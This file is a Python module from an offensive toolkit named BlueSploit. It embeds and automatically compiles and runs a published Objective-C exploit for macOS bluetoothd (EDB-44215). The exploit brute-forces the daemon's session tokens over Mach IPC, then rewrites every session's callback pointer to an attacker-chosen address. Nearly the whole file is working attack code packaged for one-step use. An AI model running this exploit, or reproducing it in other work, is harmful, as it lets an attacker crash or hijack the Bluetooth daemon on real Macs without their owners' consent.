"""
BlueSploit Module: macOS bluetoothd MIG Callback Hijack
EDB-ID: 44215  (Rani Idan / Zimperium zLabs, 2018)

Original Objective-C PoC embedded verbatim. Compiled with
`clang -x objective-c -framework Foundation` and executed.
"""

from core.base import (
    DosModule, ModuleInfo, ModuleOption,
    BTProtocol, Severity,
)
from core.utils.printer import (
    print_success, print_error, print_info, print_warning, Colors,
)
from core.utils.c_runner import compile_and_run, find_compiler
from core.utils.iokit import is_macos


OBJC_SOURCE = r"""
#import <Foundation/Foundation.h>
#include <mach/mach.h>

extern kern_return_t bootstrap_look_up(mach_port_t bs, const char *service_name, mach_port_t *service);

#define CALLBACK_ADDRESS 0xdeadbeef
#define CALLBACK_ADDITIONAL_DATA 0x13371337
#define BLUETOOTHD_CONST 0xFA300
#define BLUETOOTHD_WRONG_TOKEN 7
#define BLUETOOTHD_MACH_MESSAGE_ADD_CALLBACK_RECV_SIZE 0x44
#define BLUETOOTHD_MACH_MESSAGE_ADD_CALLBACK_SEND_SIZE 0x48
#define BLUETOOTHD_MACH_MESSAGE_ADD_CALLBACK_OPTIONS 0x113
#define BLUETOOTHD_MACH_MESSAGE_ADD_CALLBACK_MSG_ID 3
#define BLUETOOTHD_MACH_MESSAGE_ADD_CALLBACK_TIMEOUT 0x1000
#define BLUETOOTHD_MIG_SERVER_NAME "com.apple.server.bluetooth"
#define ADD_CALLBACK_MACH_MSG_OUT_RETURN_VALUE_OFFSET 0x20
#define ADD_CALLBACK_MACH_MSG_IN_SESSION_TOKEN_OFFSET 0x20
#define ADD_CALLBACK_MACH_MSG_IN_CALLBACK_ADDRESS_OFFSET 0x28
#define ADD_CALLBACK_MACH_MSG_IN_CALLBACK_DATA 0x40

typedef unsigned int mach_msg_return_value;

mach_port_t get_service_port(char *service_name) {
    kern_return_t ret;
    mach_port_t service_port = MACH_PORT_NULL;
    mach_port_t bs = MACH_PORT_NULL;
    ret = task_get_bootstrap_port(mach_task_self(), &bs);
    ret = bootstrap_look_up(bootstrap_port, service_name, &service_port);
    if (ret) { NSLog(@"Couldn't find port for %s", service_name); return MACH_PORT_NULL; }
    NSLog(@"Got port: %x", service_port);
    mach_port_deallocate(mach_task_self(), bs);
    return service_port;
}

mach_msg_return_value BTLocalDevice_add_callback(mach_port_t bluetoothd_port, mach_port_t session_token, void* callback_address, long additional_data) {
    mach_port_t receive_port = MACH_PORT_NULL;
    mach_msg_header_t * message = NULL;
    char *data = NULL;
    kern_return_t ret;
    mach_msg_return_value return_value = 0;
    mach_msg_id_t msgh_id = BLUETOOTHD_MACH_MESSAGE_ADD_CALLBACK_MSG_ID;
    mach_msg_size_t recv_size = BLUETOOTHD_MACH_MESSAGE_ADD_CALLBACK_RECV_SIZE;
    mach_msg_size_t send_size = BLUETOOTHD_MACH_MESSAGE_ADD_CALLBACK_SEND_SIZE;
    mach_msg_option_t options = BLUETOOTHD_MACH_MESSAGE_ADD_CALLBACK_OPTIONS;
    mach_msg_size_t msg_size = MAX(recv_size, send_size);

    ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &receive_port);
    if (ret) { return_value = -3; goto cleanup; }
    ret = mach_port_insert_right(mach_task_self(), receive_port, receive_port, MACH_MSG_TYPE_MAKE_SEND);
    if (ret) { return_value = -3; goto cleanup; }
    message = malloc(msg_size);
    data = (char *)message;
    memset(message, 0, msg_size);
    *((mach_port_t *)(data+ADD_CALLBACK_MACH_MSG_IN_SESSION_TOKEN_OFFSET)) = session_token;
    *((void **)(data+ADD_CALLBACK_MACH_MSG_IN_CALLBACK_ADDRESS_OFFSET)) = callback_address;
    *((long *)(data+ADD_CALLBACK_MACH_MSG_IN_CALLBACK_DATA)) = additional_data;
    message->msgh_bits = 0x1513;
    message->msgh_remote_port = bluetoothd_port;
    message->msgh_local_port = receive_port;
    message->msgh_size = send_size;
    message->msgh_reserved = 0;
    message->msgh_id = BLUETOOTHD_CONST + msgh_id;

    ret = mach_msg(message, options, send_size, recv_size, receive_port,
                   BLUETOOTHD_MACH_MESSAGE_ADD_CALLBACK_TIMEOUT, MACH_PORT_NULL);
    if (MACH_MSG_SUCCESS == ret) {
        return_value = *(mach_msg_return_value *)(((char *)message) + ADD_CALLBACK_MACH_MSG_OUT_RETURN_VALUE_OFFSET);
    } else {
        return_value = -1;
    }
cleanup:
    if (MACH_PORT_NULL != receive_port) mach_port_destroy(mach_task_self(), receive_port);
    if (NULL != message) free(message);
    return return_value;
}

void try_to_add_callback_BTLocalDeviceAddCallbacks(void *address, long value) {
    int ports_found[0xffff] = {0};
    int n = 0;
    mach_port_t bd_port = get_service_port(BLUETOOTHD_MIG_SERVER_NAME);
    if (MACH_PORT_NULL == bd_port) { NSLog(@"no bd port"); return; }
    NSLog(@"Searching tokens");
    for (int i = 0; i <= 0xffff; i++) {
        int id = (i << 16) + 1;
        int rc = BTLocalDevice_add_callback(bd_port, id, NULL, 0);
        if (rc != BLUETOOTHD_WRONG_TOKEN && rc != -1) { ports_found[n++] = id; NSLog(@"Found: %x", id); }
        id = (i << 16) + 2;
        rc = BTLocalDevice_add_callback(bd_port, id, NULL, 0);
        if (rc != BLUETOOTHD_WRONG_TOKEN && rc != -1) { ports_found[n++] = id; NSLog(@"Found: %x", id); }
        id = (i << 16);
        rc = BTLocalDevice_add_callback(bd_port, id, NULL, 0);
        if (rc != BLUETOOTHD_WRONG_TOKEN && rc != -1) { ports_found[n++] = id; NSLog(@"Found: %x", id); }
    }
    for (int i = n-1; i >= 0; i--) {
        NSLog(@"Hijack: port=%x addr=%x val=%lx", ports_found[i], (unsigned int)address, value);
        BTLocalDevice_add_callback(bd_port, ports_found[i], address, value);
    }
    NSLog(@"Done");
}

void trigger(void) {
    try_to_add_callback_BTLocalDeviceAddCallbacks((void *)CALLBACK_ADDRESS, CALLBACK_ADDITIONAL_DATA);
}

int main(int argc, char *argv[]) {
    @autoreleasepool { trigger(); }
    return 0;
}
"""


class Module(DosModule):
    info = ModuleInfo(
        name="dos/macos_bluetoothd_mig",
        description="macOS bluetoothd MIG add-callback session hijack (EDB-44215, native ObjC)",
        author=["Rani Idan / Zimperium zLabs"],
        protocol=BTProtocol.CLASSIC,
        severity=Severity.HIGH,
        references=["https://www.exploit-db.com/exploits/44215"],
    )

    def _setup_options(self) -> None:
        self.options = {}

    def run(self) -> bool:
        C = Colors
        print(f"\n  {C.RED}{'─'*55}{C.RESET}")
        print(f"  {C.BOLD}macOS bluetoothd MIG Hijack (EDB-44215){C.RESET}")
        print(f"  {C.RED}{'─'*55}{C.RESET}")
        if not is_macos():
            print_error("macOS only, needs Foundation framework + Mach IPC")
            return False
        if not find_compiler():
            print_error("No clang, install Xcode CLI tools")
            return False
        print_warning("Enumerates all session tokens and rewrites their callbacks")
        print_info("This is the original ObjC PoC, may take ~30s to enumerate 0xFFFF*3 tokens")

        rc, out, err = compile_and_run(
            OBJC_SOURCE, "bluetoothd_mig",
            ldflags=["-framework", "Foundation"],
            extension="m",
            timeout=180,
        )
        if rc == -1:
            print_error(err.strip())
            return False
        print_info(out)
        if err.strip():
            print_warning(err.strip())
        self.add_result({"edb_id": 44215, "rc": rc})
        return rc == 0
